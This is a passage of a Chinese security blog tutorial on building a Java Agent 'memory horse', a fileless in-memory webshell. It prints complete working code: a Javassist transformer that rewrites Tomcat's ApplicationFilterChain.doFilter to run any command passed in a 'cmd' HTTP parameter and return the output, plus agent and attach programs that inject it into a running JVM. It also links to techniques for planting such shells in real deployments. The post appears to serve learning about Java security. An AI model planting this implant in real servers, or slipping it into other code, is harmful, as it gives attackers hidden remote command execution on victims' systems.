class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">//Transformer.java</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line"></span><br><span class="line">import java.lang.instrument.ClassFileTransformer;</span><br><span class="line">import java.lang.instrument.IllegalClassFormatException;</span><br><span class="line">import java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line">public class Transformer implements ClassFileTransformer  {</span><br><span class="line">    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {</span><br><span class="line">        className = className.replace("/",".");</span><br><span class="line">        //如果被拦截的类是ApplicationFilterChain，那么对其进行字节码动态修改</span><br><span class="line">        if (className.equals(ClassName)){</span><br><span class="line">            // 创建一个ClassPool对象，获取默认的类搜索路径</span><br><span class="line">            ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">            try {</span><br><span class="line">                // 从ClassPool对象中获取ApplicationFilterChain类的CtClass对象</span><br><span class="line">                CtClass clz = classPool.get(className);</span><br><span class="line"></span><br><span class="line">                // 从CtClass对象中获取doFilter方法的CtMethod对象</span><br><span class="line">                CtMethod doFilterMethod = clz.getDeclaredMethod("doFilter");</span><br><span class="line">                //在doFilter方法执行前插入一段代码</span><br><span class="line">                //这段代码从HTTP请求中获取名为“cmd”的参数，并将其作为命令在服务器上执行。然后，它将命令的输出发送回HTTP响应。</span><br><span class="line">                doFilterMethod.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +</span><br><span class="line">                        "javax.servlet.http.HttpServletResponse res = response;\n" +</span><br><span class="line">                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +</span><br><span class="line">                        "if (cmd != null){\n" +</span><br><span class="line">                        "    try {\n" +</span><br><span class="line">                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +</span><br><span class="line">                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +</span><br><span class="line">                        "        String line;\n" +</span><br><span class="line">                        "        StringBuilder sb = new StringBuilder(\"\");\n" +</span><br><span class="line">                        "        while ((line=reader.readLine()) != null){\n" +</span><br><span class="line">                        "            sb.append(line).append(\"\\n\");\n" +</span><br><span class="line">                        "        }\n" +</span><br><span class="line">                        "        response.getOutputStream().print(sb.toString());\n" +</span><br><span class="line">                        "        response.getOutputStream().flush();\n" +</span><br><span class="line">                        "        response.getOutputStream().close();\n" +</span><br><span class="line">                        "    } catch (Exception e){\n" +</span><br><span class="line">                        "        e.printStackTrace();\n" +</span><br><span class="line">                        "    }\n" +</span><br><span class="line">                        "}");</span><br><span class="line">                byte[] bytes = clz.toBytecode();</span><br><span class="line">                // 将 clz 从 classpool 中删除以释放内存</span><br><span class="line">                clz.detach();</span><br><span class="line">                //返回修改后的ApplicationFilterChain类的字节码</span><br><span class="line">                return bytes;</span><br><span class="line">            }catch (Exception e){</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        return new byte[0];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后编写AgentMain注册我们的Transformer ，然后遍历已加载的 class，如果存在ApplicationFilterChain类的话那么就调用 retransformClasses 对其进行重定义。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//AgentMain.java</span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class AgentMain {</span><br><span class="line">    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";</span><br><span class="line"></span><br><span class="line">    public static void agentmain(String agentArgs, Instrumentation ins) {</span><br><span class="line">        ins.addTransformer(new Transformer(),true);</span><br><span class="line">        Class[] allLoadedClasses = ins.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        for (Class clazz : allLoadedClasses) {</span><br><span class="line">            if (clazz.getName().equals(ClassName)){</span><br><span class="line">                try {</span><br><span class="line">                    ins.retransformClasses(new Class[]{clazz});</span><br><span class="line">                }catch (Exception e){</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="3-编写Attach"><a href="#3-编写Attach" class="headerlink" title="3.编写Attach"></a>3.编写Attach</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AttachTest {</span><br><span class="line">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {</span><br><span class="line">        String jar = "";</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list =VirtualMachine.list();</span><br><span class="line">        System.out.println("Running JVM list ...");</span><br><span class="line">        // 列出当前有哪些 JVM 进程在运行</span><br><span class="line">        for (VirtualMachineDescriptor vmd : list) {</span><br><span class="line">            if(vmd.displayName().contains("com.example.agent_memhorse.AgentMemhorseApplication")){</span><br><span class="line">                String id = vmd.id();</span><br><span class="line">                System.out.println("进程ID：" + vmd.id() + "，进程名称：" + vmd.displayName());</span><br><span class="line">                VirtualMachine vm = VirtualMachine.attach(vmd.id());</span><br><span class="line">                vm.loadAgent(jar);</span><br><span class="line">                vm.detach();</span><br><span class="line">                break;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="4-打包运行"><a href="#4-打包运行" class="headerlink" title="4.打包运行"></a>4.打包运行</h2><ul><li>将AgentMain.java和Transformer.java编译打包为jar包</li><li>运行受害者application</li><li>运行AttachTest</li></ul><p>运行AttachTest前<br>![image-20230518183047834.png](从Java Agent到内存马.assets/1685069708_64701f8c533333b76102b.png!small)<br>运行AttachTest后<br>![image-20230518183115910.png](从Java Agent到内存马.assets/1685069724_64701f9c63e89782e3dd7.png!small)<br>![image-20230518183125516.png](从Java Agent到内存马.assets/1685069729_64701fa19eee804c55315.png!small)</p><blockquote><p>其实学到这里，我们基本了解了内存马的原理，但是实战中很难像我们这样直接执行Attach注入内存马，需要一些利用技巧，下面介绍一下各位师傅提出来的利用技巧。</p></blockquote><h1 id="六、Agent-内存马的利用技巧"><a href="#六、Agent-内存马的利用技巧" class="headerlink" title="六、Agent 内存马的利用技巧"></a>六、Agent 内存马的利用技巧</h1><ul><li>上传两个jar包执行</li></ul><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rebeyond/p/9686213.html">利用“进程注入”实现无文件不死webshell</a></p><ul><li>只上传agent.jar到服务器</li></ul><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1582">利用 cc11 的反序列化漏洞植入内存马</a></p><ul><li>无文件落地agent植入技术</li></ul><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10186">https://xz.aliyun.com/t/10186</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10075#toc-5">https://xz.aliyun.com/t/10075#toc-5</a></p><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1525/">https://tttang.com/archive/1525/</a></p><ul><li>优雅的注入内存马</li></ul><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1945/">https://paper.seebug.org/1945/</a></p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.s8ark.top">s8ark</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.s8ark.top/2023/05/26/%E4%BB%8EJava%20Agent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/">https://blog.s8ark.top/2023/05/26/从Java Agent到内存马/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.s8ark.top" target="_blank">少年锦时</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a><a class="post-meta__tags" href="/tags/Java-Agent/">Java Agent</a></div><div class="post_share"><div class="social-share" data-image="https://s11.ax1x.com/2024/02/03/pFQ4yo8.jpg" data-sites="wechat,qq,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://unpkg.com/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media=&quot;all&quot;"><script src="https://unpkg.com/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/26/%E4%B8%80%E6%96%87%E5%AD%A6%E4%BC%9ARocketMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2023-33246)/"><img class="prev-cover" src="https://s11.ax1x.com/2024/02/03/pFlPheP.jpg" onerror="onerror=null,src=&quot;/img/404.jpg&quot;" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一文学会RocketMQ远程命令执行漏洞(CVE-2023-33246)</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/13/%E4%B8%80%E6%AC%BEjava%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BGUI%E5%B7%A5%E5%85%B7/"><img class="next-cover" src="https://image.3001.net/images/20230513/1683985812_645f959442b2cf909d7bf.png" onerror="onerror=null,src=&quot;/img/404.jpg&quot;" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PomEye|一款java第三方组件版本识别及漏洞检测GUI工具</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/04/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" title="自己动手写Filter型内存马"><img class="cover" src="https://s11.ax1x.com/2024/02/03/pFlPGiF.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-04</div><div class="title">自己动手写Filter型内存马</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC1%E9%93%BE/" title="CC链学习笔记-CC1链"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC1链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457/" title="CC链学习笔记-CC2457"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC2457</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE/" title="CC链学习笔记-CC6链"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC6链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3%E9%93%BE/" title="CC链学习笔记-CC3链"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-CC3链</div></div></a></div><div><a href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="CC链学习笔记-前置知识"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="title">CC链学习笔记-前置知识</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null,this.src=&quot;/img/friend_404.gif&quot;" alt="avatar"></div><div class="author-info__name">s8ark</div><div class="author-info__description">但行好事，莫问前程</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://space.bilibili.com/471790025" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_41401434" target="_blank" title="csdn"><i class="iconfont icon-csdn"></i></a><a class="social-icon" href="https://www.zhihu.com/people/yu-ji-4-35-17" target="_blank" title="知乎"><i class="iconfont icon-shejiaotubiao-10"></i></a><a class="social-icon" href="https://github.com/feiweiliang" target="_blank" title="Github"><i class="iconfont icon-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%9D%E8%AF%86Java-Agent"><span class="toc-number">1.</span> <span class="toc-text">一、初识Java Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Java-Agent%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.Java Agent启动方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%86%E8%A7%A3Agent-Jar"><span class="toc-number">1.2.</span> <span class="toc-text">2.了解Agent Jar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Java-Agent-%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">3.Java Agent 的实现原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8Agent-dump-JVM%E4%B8%AD%E7%9A%84Class"><span class="toc-number">2.</span> <span class="toc-text">二、使用Agent dump JVM中的Class</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">2.1.</span> <span class="toc-text">1.准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAapplication"><span class="toc-number">2.2.</span> <span class="toc-text">2.编写一个application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99Agent"><span class="toc-number">2.3.</span> <span class="toc-text">3.编写Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BC%96%E5%86%99Attach"><span class="toc-number">2.4.</span> <span class="toc-text">4.编写Attach</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8Agent%E6%9B%BF%E6%8D%A2JVM%E4%B8%AD%E7%9A%84%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">三、使用Agent替换JVM中的类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-pom-xml"><span class="toc-number">3.1.</span> <span class="toc-text">1. pom.xml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-application"><span class="toc-number">3.2.</span> <span class="toc-text">2. application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99Agent-1"><span class="toc-number">3.3.</span> <span class="toc-text">3. 编写Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BC%96%E5%86%99Attach-1"><span class="toc-number">3.4.</span> <span class="toc-text">4.编写Attach</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%BF%90%E8%A1%8C"><span class="toc-number">3.5.</span> <span class="toc-text">5. 运行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%81%87%E8%A7%81Javasist"><span class="toc-number">4.</span> <span class="toc-text">四、遇见Javasist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%88%9D%E6%AD%A5%E6%9E%84%E9%80%A0Agent-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">五、初步构造Agent 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0application"><span class="toc-number">5.1.</span> <span class="toc-text">1.构造application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BC%96%E5%86%99Agent"><span class="toc-number">5.2.</span> <span class="toc-text">2.编写Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99Attach"><span class="toc-number">5.3.</span> <span class="toc-text">3.编写Attach</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%89%93%E5%8C%85%E8%BF%90%E8%A1%8C"><span class="toc-number">5.4.</span> <span class="toc-text">4.打包运行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">6.</span> <span class="toc-text">六、Agent 内存马的利用技巧</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background:0 0"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By s8ark</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/#/Integrated/index" style="color:#fff" target="_blank"><img src="https://img.shields.io/badge/%E5%86%80ICP%E5%A4%87-2022029585%E5%8F%B7--1-yellow" alt="冀ICP备2022029585号-1"></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span> 数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://unpkg.com/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'D8nose2CIyOjFl8XPfDeFNy6-gzGzoHsz',
      appKey: '2i3KumjG4kgQlX0YoU53eStd',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://unpkg.com/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/jquery.js"></script><script src="/js/foot.js"></script><script async="" src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><script id="click-show-text" src="https://unpkg.com/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async=""></script><link rel="stylesheet" href="https://unpkg.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media=&quot;all&quot;"><script src="https://unpkg.com/aplayer/dist/APlayer.min.js"></script><script src="https://unpkg.com/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>